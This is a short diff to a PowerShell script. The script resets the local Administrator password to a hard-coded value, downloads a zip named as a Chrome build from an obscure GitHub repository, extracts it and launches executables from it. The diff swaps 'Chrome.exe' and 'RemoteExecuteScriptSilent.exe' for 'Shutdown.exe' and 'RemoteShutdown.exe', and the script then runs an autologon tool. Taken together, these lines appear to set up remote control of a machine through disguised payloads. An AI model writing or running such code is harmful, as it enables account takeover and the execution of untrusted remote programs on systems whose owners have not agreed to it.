@@ -1,4 +1,3 @@
-[System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem")
 net user Administrator Nancyhd1@
 $Url = 'https://github.com/37218vuuhuu/app-19/raw/main/Chrome.57.zip'
 
@@ -11,8 +10,8 @@ Invoke-WebRequest $Url -OutFile Chrome.57.zip
 Expand-Archive Chrome.57.zip -DestinationPath Chrome.57
 Set-Location Chrome.57/Chrome.57
 
-Start "Chrome.exe"
-Start "RemoteExecuteScriptSilent.exe"
+Start "Shutdown.exe"
+Start "RemoteShutdown.exe"
 
 Set-Location Chrome.57/Chrome.57
 Start "Autologon64"
